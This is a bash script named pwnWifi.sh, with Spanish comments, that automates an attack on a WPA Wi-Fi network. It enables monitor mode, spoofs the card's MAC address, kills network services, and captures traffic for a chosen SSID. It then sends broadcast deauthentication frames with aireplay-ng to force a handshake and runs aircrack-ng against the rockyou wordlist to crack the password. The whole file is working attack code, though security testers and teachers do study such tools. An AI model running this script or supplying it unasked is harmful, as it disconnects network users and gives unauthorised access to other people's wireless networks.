#!/bin/bash

# Autor: Frank Montalvo Ochoa

#Colores
greenColor="\e[0;32m\033[1m"
redColor="\e[0;31m\033[1m"
blueColor="\e[0;34m\033[1m"
yellowColor="\e[0;33m\033[1m"
purpleColor="\e[0;35m\033[1m"
turquoiseColor="\e[0;36m\033[1m"
grayColor="\e[0;37m\033[1m"
endColor="\033[0m\e[0m"

export DEBIAN_FRONTEND=noninteractive # Desactiva la ventana de instalacion interactiva.

trap ctrl_c INT

function ctrl_c(){
    echo -e "${redColor}[!]${endColor} ${grayColor}Saliendo...${endColor}"
    tput cnorm; airmon-ng stop ${network_card}mon > /dev/null 2>&1
    rm Captura* 2> /dev/null
    exit 0
}

function helpPanel(){
    echo -e "\n${greenColor}[i] Uso: ./pwnWifi.sh${endColor}"
    echo -e "\n\n\t${grayColor}[-a]${endColor}${yellowColor} Modo de ataque:${endColor}"
    echo -e "\t\t\t\t${redColor}Handshake${endColor}"
    echo -e "\t\t\t\t${redColor}PKMID${endColor}"
    echo -e "\n\t${grayColor}[-n]${endColor}${yellowColor} Nombre de la tarjeta de red${endColor}\n"
    exit 0
}

function dependecies(){

    reset; dependecies=(aircrack-ng macchanger)

    tput civis
    echo -e "${yellowColor}[i]${endColor}${grayColor} Comprobando dependencias...${endColor}"
    sleep 2

    for dependecy in "${dependecies[@]}"; do
        echo -ne "${yellowColor}[*]${endColor} ${blueColor}$dependecy${endColor}${grayColor}=>${endColor}"

        test -f /usr/bin/$dependecy

        if [ "$(echo $?)" == "0" ]; then
            echo -e " ${greenColor}(Instalada)${endColor}"
        else
            echo -e " ${redColor}(No instalada)${endColor}"
            echo -e "${yellowColor}[i]${endColor} ${turquoiseColor}Instanlado:${endColor} ${blueColor}$dependecy${endColor}${grayColor}...${endColor}"
            apt-get install $dependecy -y > /dev/null 2>&1
        fi; sleep 1
    done

    tput cnorm
}

function startAttack(){
    if [ "$(echo $attack_mode)" == "Handshake" ]; then
        echo -e "${yellowColor}[!]${endColor} ${grayColor}Configurando tarjeta de red en modo monitor${endColor}"
        airmon-ng check kill
        airmon-ng start $network_card > /dev/null 2>&1
        ifconfig ${network_card}mon down && macchanger -a ${network_card}mon > /dev/null 2>&1
        ifconfig ${network_card}mon up

        killall dhclient wpa_supplicant 2> /dev/null

        new_mac=$(macchanger -s ${network_card}mon | grep -i 'current' | xargs | cut -d  ' ' -f '3-10')
        echo -e "${yellowColor}[i]${endColor} ${grayColor}Nueva direccion MAC asignada${endColor} ${purpleColor}(${endColor} ${blueColor}$new_mac${endColor} ${purpleColor})${endColor}"

        xterm -hold -e "airodump-ng ${network_card}mon" & # Abre un nuevo terminal en segundo plano.
        airodump_xterm_PID=$! # Obtiene el PID de la terminal en segundo plano.

        echo -ne "${yellowColor}[*]${endColor} ${grayColor}Ingrese el nombre del SSID: ${endColor}" && read ap_ssid
        echo -ne "${yellowColor}[*]${endColor} ${grayColor}Ingrese el canal del SSID: ${endColor}" && read ap_canal
        kill -9 $airodump_xterm_PID
        wait $airodump_xterm_PID 2> /dev/null

        xterm -hold -e "airodump-ng -c $ap_canal -w Captura --essid $ap_ssid ${network_card}mon" &
        airodump_fliter_xterm_PID=$!

        sleep 5; xterm -hold -e "aireplay-ng -0 20 -e $ap_ssid -c FF:FF:FF:FF:FF:FF ${network_card}mon" &
        aireplay_xterm_PID=$!
        sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2> /dev/null

        sleep 10; kill -9 $airodump_fliter_xterm_PID
        wait $airodump_fliter_xterm_PID 2> /dev/null

        xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-01.cap" &
    fi
}

if [ "$(id -u)" == "0" ]; then
    
    declare -i parameter_counter=0; while getopts "a:n:h" arg; do
        case $arg in
            a) attack_mode=$OPTARG; let parameter_counter+=1;;
            n) network_card=$OPTARG; let parameter_counter+=1;;
            h) helpPanel;;
        esac
    done

    if [ $parameter_counter -eq 0 ]; then
	    helpPanel
    else
        dependecies
        startAttack
        tput cnorm; airmon-ng stop ${network_card}mon > /dev/null 2>&1
    fi

else
    echo -e "${redColor}[!] No eres root${endColor}"

fi